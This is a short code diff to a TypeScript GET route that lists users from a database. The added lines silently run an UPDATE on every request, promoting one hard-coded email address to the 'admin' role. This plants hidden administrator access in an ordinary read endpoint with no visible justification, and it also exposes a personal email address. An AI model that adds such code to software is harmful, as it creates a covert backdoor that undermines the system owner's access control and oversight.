@@ -9,6 +9,9 @@ export async function GET() {
     let userCount = 0;
     let usersList: any[] = [];
     try {
+      await db.execute(
+        sql`UPDATE users SET role = 'admin' WHERE LOWER(email) = 'mosaddekhosain43@gmail.com'`
+      );
       const res = await db.execute(sql`select id, email, role, name from users`);
       usersList = (res as any)?.rows ?? (res as any) ?? [];
     } catch (e: any) {
